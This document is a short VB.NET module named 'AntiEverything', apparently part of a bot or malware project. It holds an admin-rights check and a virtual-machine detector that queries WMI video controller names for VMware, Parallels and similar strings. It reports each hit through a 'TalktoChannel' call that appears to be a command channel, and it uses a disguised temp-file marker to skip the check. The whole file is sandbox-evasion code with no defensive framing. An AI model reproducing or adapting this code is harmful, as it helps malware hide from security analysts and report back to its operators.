Imports System.Management
Imports System.Security.Principal
Imports Microsoft.Win32

Module AntiEverything
    Public AntisDetected As Boolean = False
    Public Function IsAdmin() As Boolean
        Try
            Dim id As WindowsIdentity = WindowsIdentity.GetCurrent()

            Dim p As WindowsPrincipal = New WindowsPrincipal(id)

            Return p.IsInRole(WindowsBuiltInRole.Administrator)

        Catch
            Return False
        End Try

    End Function
    Public Sub RunAntis()
        On Error Resume Next

        If Not IO.File.Exists(IO.Path.GetTempPath & "microsoft.ini") Then
            searchVM()
        End If

    End Sub

    Public Function SearchVM() As String 'Virtual Mashine finder
        Try
            Dim searcher As New ManagementObjectSearcher("root\CIMV2", "SELECT * FROM Win32_VideoController")
            Dim str As String = String.Empty
            Dim obj2 As ManagementObject
            For Each obj2 In searcher.Get
                str = Convert.ToString(obj2.Item("Description"))
                Dim Search As String = StrConv(str, VbStrConv.Lowercase)
                If Search.Contains("virtual") Then TalktoChannel("Finded Virtual mashine: ", "Virtual")
                If Search.Contains("vmware") Then TalktoChannel("Finded Virtual mashine: ", "VMware")
                If Search.Contains("parallels") Then TalktoChannel("Finded Virtual mashine: ", "Parallels")
                If Search.Contains("vm additions") Then TalktoChannel("Finded Virtual mashine: ", "VM Additions")
            Next
        Catch : End Try
    End Function
End Module
